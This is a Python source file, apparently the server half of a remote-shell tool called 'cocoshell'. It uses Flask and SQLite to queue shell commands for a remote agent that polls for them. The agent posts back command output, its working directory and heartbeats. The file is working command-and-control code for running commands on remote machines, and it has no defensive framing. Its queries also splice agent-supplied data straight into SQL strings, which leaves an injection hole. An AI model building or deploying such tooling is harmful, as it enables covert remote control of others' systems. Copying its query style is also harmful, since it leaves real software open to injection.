import logging, sqlite3, argparse, sys, datetime
from os.path import exists
from multiprocessing import Process
from flask import Flask, session, request
from werkzeug.exceptions import BadRequest

parser = argparse.ArgumentParser()
parser.add_argument("-r", "--route", help="the api endpoint the agent will connect to")
args, leftovers = parser.parse_known_args()

route = args.route

db_exists = exists("cocoshell.db")
con = sqlite3.connect("cocoshell.db", check_same_thread=False)
cur = con.cursor()

if not db_exists:
    # Either set up a new database ..
    cur.execute("CREATE TABLE commands (id integer primary key autoincrement, cmd text, result text, hasBeenRun integer)")
    cur.execute("CREATE TABLE pwd (id integer, pwd text)")
    cur.execute("CREATE TABLE pulse (id integer primary key autoincrement, beat timestamp)")
    cur.execute("INSERT INTO commands (cmd, result, hasBeenRun) VALUES (null, null, 1)")
    cur.execute("INSERT INTO pwd (id, pwd) VALUES (1, 'NULL')")
    cur.execute("INSERT INTO pulse (beat) VALUES (null)")
    con.commit()
else:
    # .. or make sure, that nothing from the last session is annoying
    cur.execute("UPDATE commands SET hasBeenRun = 1")
    con.commit()

#############################################################################

def is_command_available():
    cur.execute("SELECT * FROM commands ORDER BY id DESC LIMIT 1")
    return cur.fetchone()

def set_result(result):
    cur.execute("UPDATE commands SET result = '" + result + "' WHERE hasBeenRun = 0")
    cur.execute("UPDATE commands SET hasBeenRun = 1")
    con.commit()
    return True

def set_pwd(pwd):
    cur.execute(f"UPDATE pwd SET pwd = '{pwd}' WHERE id = 1")
    con.commit()
    return True

def get_pwd():
    tmp_cur = con.cursor()
    tmp_cur.execute("SELECT pwd FROM pwd LIMIT 1")
    result = tmp_cur.fetchone()[0]
    tmp_cur.close()
    return result

def heartbeat():
    now = datetime.datetime.now()
    timestamp = now.strftime("%H:%M:%S %m/%d/%Y")
    tmp_cur = con.cursor()
    tmp_cur.execute("INSERT INTO pulse (beat) VALUES ('" + timestamp + "')")
    tmp_cur.close()
    con.commit()
    return timestamp

def reset_agent():
    cur.execute("UPDATE commands SET hasBeenRun = 1")
    cur.execute("UPDATE pwd SET pwd = 'NULL'")
    con.commit()

#############################################################################

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
api = Flask(__name__)
#print(route, file=sys.stderr)

@api.route('/' + route + '/<cmd>', methods=['GET', 'POST'])
def command_handling(cmd):
    if cmd == 'get':
        last = is_command_available()
        if last[3] == 1:
            return ''
        else:
            if last[1] == "exit-agent":
                reset_agent()
            return last[1]
    if cmd == 'post':
        set_result(request.data.decode())
        return ''
    if cmd == 'pwd':
        pwd = request.data.decode()
        if pwd == "":
            return get_pwd()
        if pwd is not None:
            set_pwd(pwd)
            return ''
    if cmd == "pulse":
        return heartbeat()
        
        
if __name__ == '__main__':
    try:
        api.run()
    except KeyboardInterrupt:
        exit